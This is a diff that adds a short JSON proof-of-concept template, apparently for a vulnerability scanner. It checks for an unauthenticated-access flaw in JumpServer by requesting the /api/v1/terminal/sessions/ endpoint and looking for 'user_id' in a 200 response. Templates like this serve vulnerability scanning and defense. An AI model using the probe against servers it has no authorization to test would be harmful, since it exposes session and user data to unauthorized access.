@@ -1,0 +1,14 @@
+{
+	"name":"JumpServer未授权漏洞",
+	"tag":"jumpserver",
+	"type":"other",
+	"poc":{
+		"pocGet":"/api/v1/terminal/sessions/?limit=1",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(user_id)"
+	}
+}
